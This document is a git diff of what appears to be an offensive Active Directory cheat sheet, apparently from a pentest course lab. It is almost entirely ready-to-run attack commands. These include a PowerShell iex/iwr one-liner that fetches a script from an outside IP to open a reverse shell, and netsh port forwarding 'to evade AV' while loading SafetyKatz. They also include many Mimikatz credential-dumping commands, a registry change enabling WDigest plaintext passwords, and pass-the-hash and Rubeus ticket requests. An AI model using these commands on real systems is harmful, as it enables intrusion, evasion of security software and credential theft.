@@ -25,6 +25,7 @@ ls \\\\\[hostname]\c$
 
 **Connect to machine with administrator privs**
 
+{% code overflow="wrap" %}
 ```powershell
 Enter-PSSession -Computername
 
@@ -35,6 +36,7 @@ winrs -r:hostname -u:server\usernmae -p:password-of-user command-to-run
 Other Remoting
 Use winrm.vbs and/or COM objects of WSMan object https://github.com/bohops/WSMan-WinRM 
 ```
+{% endcode %}
 
 ****\
 **1-1 Save and use sessions of a machine**
@@ -99,6 +101,8 @@ Invoke-Command -session $sess -ScriptBlock {$Proc.Name}
 
 ```powershell
 Copy-Item .\Invoke-MimikatzEx.ps1 \\hostname\c$\'Program Files'
+
+xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
 ```
 
 **1-1 Powershell reverse shell**
@@ -106,6 +110,19 @@ Copy-Item .\Invoke-MimikatzEx.ps1 \\hostname\c$\'Program Files'
 {% code overflow="wrap" %}
 ```powershell
 powershell.exe iex (iwr http://xx.xx.xx.xx/Invoke-PowerShellTcp.ps1 -UseBasicParsing);reverse -Reverse -IPAddress xx.xx.xx.xx -Port 4000
+```
+{% endcode %}
+
+**Port Forwarding on Localhost to evade AV**
+
+{% code overflow="wrap" %}
+```powershell
+$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.x"
+
+$null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::ekeys exit
+
+If interacitve logon:
+C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe
 ```
 {% endcode %}
 
@@ -143,14 +160,29 @@ Physmem2profit
 
 **Dump credentials on local/remote machine**
 
-{% code overflow="wrap" %}
-```powershell
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">https://tools.thehacker.recipes/mimikatz/modules
+
 Invoke-Mimikatz -command '"sekurlsa::ekeys"'
+Invoke-Mimikatz -Command vault::cred /patch   //Scheduled tasks
+Invoke-Mimikatz -Command lsadump::lsa /patch  //local accounts
+
+Invoke-Mimikatz -Command sekurlsa::wdigest
+Invoke-Mimikatz -Command sekurlsa::credman sekurlsa::credman
+<strong>Invoke-Mimikatz -Command sekurlsa::logonPasswords full
+</strong>
+<strong>Invoke-Mimikatz -command lsadump::cache
+</strong>Invoke-Mimikatz -command lsadump::sam
+Invoke-Mimikatz -command lsadump::secrets
+Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 
 Invoke-Mimikatz -DumpCreds   //default parameter
-❗Invoke-Mimikatz -DumpCreds -Computername @("host1","host2")    //uses PowerShell remoting cmdlet Invoke-Command (need local admin privs on remote host)
-```
-{% endcode %}
+<strong>
+</strong><strong>Invoke-Mimikatz -DumpCreds -Computername @("host1","host2")    //uses PowerShell remoting cmdlet Invoke-Command (need local admin privs on remote host)
+</strong><strong>
+</strong><strong>When .exe run first:
+</strong>privilege::debug
+token::elevate
+</code></pre>
 
 **Write to lsass / "over pass the hash" - generate tokens from hashes (we have the hash for the User specified)**
 
@@ -162,15 +194,19 @@ Invoke-Mimikatz -command '"sekurlsa::pth /user:Administrator /domain:dom.local /
 
 Creates a valid kerberos ticket using the ntlm hash of a user. Authenticate to Kerberos enabled Services afterfwards.
 
-
-
 **Extracting credentials from credentials vault / scheduled tasks**
 
 ```powershell
 Invoke-Mimikatz -Command '"token::elevate" "vault::cred /patch"'
 ```
 
+**Enable Wdigest Enable**
 
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG\_DWORD /d 1
+
+gpupdate /force
+
+sekrusla::wdigest
 
 
 
@@ -226,6 +262,8 @@ Safetykatz.exe "sekurlsa::pth /user:administrator /domain:dom.local /aes256:hash
 <strong>
 </strong><strong>-------------
 </strong>No Admin rights needed
+C:\AD\Tools\Rubeus.exe asktgt /user:svcadmin 
+
 <strong>Rubeus.exe asktgt /user:USER &#x3C;/rc4:HASH | /aes128:HASH | /aes256:HASH> [/domain:DOMAIN] [/opsec] /ptt
 </strong><strong>
 </strong><strong>Needs admin rights:
